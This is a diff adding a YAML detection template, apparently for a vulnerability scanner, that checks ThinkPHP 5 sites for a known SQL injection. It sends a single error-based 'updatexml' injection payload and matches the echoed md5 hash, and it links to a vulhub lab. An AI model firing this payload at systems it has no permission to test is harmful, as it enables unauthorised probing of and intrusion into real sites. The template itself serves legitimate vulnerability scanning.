@@ -1,0 +1,10 @@
+name: poc-yaml-thinkphp5-sqlinject
+rules:
+  - method: GET
+    path: "/index.php?ids[0,updatexml(0,concat(md5(123)),0)]=1"
+    expression: |
+      status == 500 && body.bcontains(b'cb962ac59075b964b07152d234b70')
+detail:
+  author: violin
+  links:
+    - https://github.com/vulhub/vulhub/tree/master/thinkphp/in-sqlinjection
